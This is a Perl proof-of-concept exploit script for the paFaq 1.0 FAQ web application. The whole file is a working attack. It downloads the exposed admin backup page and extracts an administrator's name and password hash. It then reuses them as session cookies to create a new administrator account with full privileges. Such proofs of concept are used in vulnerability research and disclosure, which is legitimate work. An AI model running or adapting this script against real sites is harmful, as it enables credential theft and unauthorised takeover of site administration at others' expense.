#!/usr/bin/perl -w
##########################################################################
# paFaq 1.0 Add Administrator PoC // By James // http://www.gulftech.org
##########################################################################

use LWP::UserAgent;

# Set up the LWP User Agent
$ua = new LWP::UserAgent;
$ua->agent("paFaq Hash Grabber v1.0");

if ( !$ARGV[0] ) { print "Usage : pafaq.pl http://path/to/pafaq"; exit; }

my $key_time = time();

my $dbm_path = $ARGV[0] . '/admin/backup.php';
my $add_user = 'pafaq'; # change this?
my $add_pass = 'pafaq'; # change this?
my $add_email = 'pafaq@dev.null'; # change this?
my $add_path = $ARGV[0] . '/admin/index.php?area=users&act=doadd&name=' . $add_user . '&password=' . $add_pass . '&email=' . $add_email .
'&notify=1&can_edit_settings=1&can_edit_admins=1&can_add_admins=1&can_del_admins=1&is_a_admin=1';

print "[*] Trying Host " . $ARGV[0] . "\n";

my $dbm = $ua->get($dbm_path);

if ( $dbm->content =~ /'([0-9]{1,8})',\s'(.*)',\s'([a-f0-9]{32})'/i)
{
        print "[+] User ID Is " . $1 . "\n";
        print "[+] User Name Is " . $2 . "\n";
        print "[+] User Password Is " . $3 . "\n";
        print "[*] Trying to add new user ...\n";

        my @cookie = ('Cookie' => 'pafaq_user=' . $2 . '; pafaq_pass=' . $3);
        my $add = $ua->get($add_path, @cookie);

        if ( $add->content =~ /has been created successfully/ )
        {
                print "[+] User $add_user Added Successfully!\n";
                print "[+] User Password Is $add_pass\n";
        }
        else
        {
                print "[!] Unable To Add User! Maybe the username is already taken? ...\n";
                print "[!] Shutting Down ...\n";
                exit;
        }
}
else
{
        print "[!] The Host Is Not Vulnerable ...\n";
        print "[!] Shutting Down ...\n";
        exit;
}
exit;
